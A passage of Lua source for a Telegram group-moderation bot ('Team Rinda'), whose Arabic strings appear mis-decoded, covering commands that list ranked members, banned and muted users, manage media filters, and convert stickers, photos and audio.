text = "โ๏ธฐ*ูุง ููุฌุฏ ูููุฒูู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text == "ุงูุงุฏูููู" and ChCheck(msg) or text == "ุงูุงุฏูููุฉ" and ChCheck(msg) then 
local rio =  'Rio:Admins:'..msg.chat_id_
local List = DevRio:smembers(Rinda..rio)
text = "โ๏ธฐูุงุฆูุฉ ุงูุงุฏูููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธฐ*ูุง ููุฌุฏ ุงุฏูููู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if Constructor(msg) then
if text == "ุงููุฏุฑุงุก" and ChCheck(msg) or text == "ูุฏุฑุงุก" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Managers:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงููุฏุฑุงุก โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ูุฏุฑุงุก*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
if text == "ุงูููุธููู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Cleaner:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงูููุธููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ููุธููู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุธููู โข",callback_data="/DelCleanr:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if BasicConstructor(msg) then
if text == "ุงูููุดุฆูู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Constructor:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงูููุดุฆูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ููุดุฆูู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Owner(msg) then
if text == "ุงููุงูููู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Owner:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงููุงูููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ูุงูููู*"
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "ุงูููุดุฆูู ุงูุงุณุงุณููู" and ChCheck(msg) or text == "ููุดุฆูู ุงุณุงุณููู" and ChCheck(msg) or text == "ุงูููุดุฆูู ุงูุงุณุงุณูู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:BasicConstructor:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงูููุดุฆูู ุงูุงุณุงุณููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ููุดุฆูู ุงุณุงุณููู*"
end
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("ุงูููุดุฆ") and ChCheck(msg) or text ==("ุงููุงูู") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณุงุจ ุงูููุดุฆ ูุญุฐูู", 1, "md")
return false  
end
local msg_id = msg.id_/2097152/0.5
Text = "*โ๏ธฐOwner Name โฌ * ["..dp.first_name_.."](T.me/"..dp.username_..")\n*โ๏ธฐOwner User โฌ* [@"..dp.username_.."]\n*โ๏ธฐOwner id โฌ* ["..dp.id_.."](T.me/"..dp.username_..")"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..dp.first_name_..' ',url="t.me/"..dp.username_ or Source_Rinda}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..dp.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)    
end
end
end,nil)   
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text == "ุงูููุชูููู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Muted:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงูููุชูููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ููุชูููู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุชูููู โข",callback_data="/DelMute:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงููููุฏูู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Tkeed:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงููููุฏูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธฐ*ูุง ููุฌุฏ ูููุฏูู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููููุฏูู โข",callback_data="/DelKeed:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงููุญุธูุฑูู" and ChCheck(msg) or text == "ุงููุญุถูุฑูู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:Ban:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงููุญุธูุฑูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธฐ*ูุง ููุฌุฏ ูุญุธูุฑูู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุญุธูุฑูู โข",callback_data="/DelBan:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงููุทุงูู" and ChCheck(msg) or text == "ุงููุทุงูุฉ" and ChCheck(msg) then
local List = DevRio:smembers(Rinda..'User:Donky:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ูุทุงูุฉ ุงููุฌููุนู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธฐ*ูุง ููุฌุฏ ูุทุงูู ูููุง ุงูุงุฏู*"
end
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุงุฆูู ุงูููุน" and RioConstructor(msg) and ChCheck(msg) then
local List = DevRio:hkeys(Rinda..'Rio:Filters:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงูููุน โขโฏ\n-----------------------------------------\n"
for k, v in pairs(List) do
text = text..k..'~ โจ '..v..' โฉ\n'
end
if #List == 0 then
text = "โ๏ธฐูุง ุชูุฌุฏ ูููุงุช ููููุนู"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุชุญุฑูุงุช โข",callback_data="/DelGif:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุตูุงุช โข",callback_data="/DelSticker:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูุตูุฑ โข",callback_data="/DelPhoto:"..msg.sender_user_id_},{text="โข ูุณุญ ุงููููุงุช โข",callback_data="/DelTextfilter:"..msg.sender_user_id_}},{{text="โข ูุณุญ ููุงุฆู ุงูููุน โข",callback_data="/DelAllFilter:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text or List).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงููุทูุฑูู ุงูุงุณุงุณููู" and ChCheck(msg) and RioSudo(msg) or text == "ุงูุงุณุงุณููู" and RioSudo(msg) and ChCheck(msg) or text == "โข ุงูุงุณุงุณููู โ" and RioSudo(msg) and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:RioSudo:')
text = "โ๏ธฐูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธฐ*ุนุฐุฑุง ูู ูุชู ุฑูุน ุงู ูุทูุฑูู ุงุณุงุณููู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงุณุงุณููู โข",callback_data="/DelRioSudo:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงููุทูุฑูู ุงูุซุงููููู" and SecondSudo(msg) and ChCheck(msg) or text == "ุงูุซุงููููู" and SecondSudo(msg) and ChCheck(msg) or text == "โข ุงูุซุงููููู โ" and SecondSudo(msg) and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:SecondSudo:')
text = "โ๏ธฐูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธฐ*ุนุฐุฑุง ูู ูุชู ุฑูุน ุงู ูุทูุฑูู ุซุงููููู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุซุงููููู โข",callback_data="/DelSecondSudo:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if SudoBot(msg) then
if text == "ูุงุฆูู ุงูุนุงู" and ChCheck(msg) or text == "ุงููุญุธูุฑูู ุนุงู" and ChCheck(msg) or text == "ุงูููุชูููู ุนุงู" and ChCheck(msg) or text == "โข ูุงุฆูู ุงูุนุงู โ" and ChCheck(msg) or text == "โข ูุงุฆูู ุงูุนุงู โ" and ChCheck(msg) then 
local BanAll = DevRio:smembers(Rinda..'Rio:BanAll:')
local MuteAll = DevRio:smembers(Rinda..'Rio:MuteAll:')
if #BanAll ~= 0 then 
text = "โ๏ธฐูุงุฆูุฉ ุงููุญุธูุฑูู ุนุงู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(BanAll) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."โ๏ธฐูุงุฆูุฉ ุงูููุชูููู ุนุงู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(MuteAll) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "โ๏ธฐ*ูู ูุชู ุญุธุฑ ุงู ูุชู ุงู ุนุถู*"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ูุงุฆูู ุงูุนุงู โข",callback_data="/DelListAll:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงููุทูุฑูู" and ChCheck(msg) or text == "โข ุงููุทูุฑูู โ" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:SudoBot:')
text = "โ๏ธฐูุงุฆูุฉ ุงููุทูุฑูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local sudouser = DevRio:get(Rinda..'Rio:Sudos'..v) 
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] โฌ Gps : "..(sudouser or 0).."\n"
else
text = text..k.."~ : "..v.." โฌ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "โ๏ธฐ*ุนุฐุฑุง ูู ูุชู ุฑูุน ุงู ูุทูุฑูู*"
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==("ุฑูุน ุงูููุดุฆ") and ChCheck(msg) or text ==("ุฑูุน ุงููุงูู") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณุงุจ ุงูููุดุฆ ูุญุฐูู", 1, "md")
return false  
end
local UserName = (dp.username_ or "Source_Rinda")
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุฑูุน ูุงูู ุงููุฌููุนู โข ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevRio:sadd(Rinda.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text == 'ููุน' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:sadd(Rinda.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ููุน ุงูููุตู ุถูุนู ูู ูุชู ุงุฑุณุงูู ูุฌุฏุฏุง', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:sadd(Rinda.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ููุน ุงูุตูุฑู ุถูุนู ูู ูุชู ุงุฑุณุงููุง ูุฌุฏุฏุง', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:sadd(Rinda.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ููุน ุงููุชุญุฑูู ุถูุนู ูู ูุชู ุงุฑุณุงููุง ูุฌุฏุฏุง', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงูุบุงุก ููุน' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:srem(Rinda.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ููุน ุงูููุตู ูููููู ุงุฑุณุงูู ุงูุงู', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:srem(Rinda.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ููุน ุงูุตูุฑู ูููููู ุงุฑุณุงููุง ุงูุงู', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:srem(Rinda.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ููุน ุงููุชุญุฑูู ูููููู ุงุฑุณุงููุง ุงูุงู', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == "ุชูุนูู ุชุญููู ุงูุตูุบ" or text == "ุชูุนูู ุงูุชุญููู") and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุชุญููู ุงูุตูุบ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "ุชุนุทูู ุชุญููู ุงูุตูุบ" or text == "ุชุนุทูู ุงูุชุญููู") and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุชุญููู ุงูุตูุบ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'ุชุญููู' and not DevRio:get(Rinda..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local Rio = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Rio.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local Rio = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Rio.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','โ๏ธฐุชู ุชุญููู ุงูููุตู ุงูู ุตูุฑู')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local Rio = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Rio.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"โ๏ธฐุชู ุชุญููู ุงููMp3 ุงูู ุจุตูู")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local Rio = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Rio.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==("ูุดู") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ุงูุฏู") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevRio:sismember(Rinda..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'ูุญุธูุฑ ุนุงู'
elseif DevRio:sismember(Rinda..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'ููุชูู ุนุงู'
elseif DevRio:sismember(Rinda..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ูุญุธูุฑ'
elseif DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ููุชูู'
elseif DevRio:sismember(Rinda..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ูููุฏ'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nโ๏ธฐุงููููุฏ โข '..Tkeed
else 
Tked = '' 
end
if DevRio:sismember(Rinda..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
